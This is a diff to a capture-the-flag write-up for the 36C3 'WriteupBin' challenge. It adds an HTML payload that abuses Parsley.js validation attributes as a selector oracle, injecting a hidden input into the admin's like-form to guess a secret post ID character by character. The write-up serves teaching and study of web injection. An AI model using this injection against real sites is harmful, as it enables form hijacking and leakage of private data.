@@ -56,8 +56,22 @@ So recap:
 * Parsley searches for this element: `a[href^="/show.php?id=6"]`
 * If parsley doesn't find it, it matches the contents of the validated `input` to the selector string - validation **passes**. The admin likes the write-up
 * If parsley finds it, it matces the contents of the validated `input` to `element.val()` - which **fails**, since the `a` element produces an empty string on `val()`.
-* Since the validation fails, we inject an input to the like `<form>` which overwrites the `id input` in the `form` - The admin likes a write-up of our choosing
-
+* Since the validation fails, we inject an input to the like `<form>` which overwrites the `id input` in the `form` - The admin likes a write-up of our choosing  
+The injected text:
+```
+<form data-parsley-validate>
+  <input type="text" 
+         data-parsley-trigger="focusout"
+         data-parsley-equalto='a[href^="/show.php?id=GUESS"]'
+         
+         data-parsley-errors-container="form[action='/like.php']"
+         data-parsley-error-message='<input type="input" name="id" value="0000000000000000">'
+         
+         value='a[href^="/show.php?id=GUESS"]'
+         autofocus>
+  <input type="submit">
+</form>
+```
 We don't actually need the admin to like an actual post, we just need him **not to like ours** so we can use `value="0000000000000000"`.  
 We loop for 16 characters and try to guess the ID of the flag character after character. Once we get the ID of the admin's write-up, we can view it and get the flag.  
 The script that solves the challenge can be found [here](https://github.com/amelkiy/write-ups/blob/master/CCC/36c3/WriteupBin/solve.py)
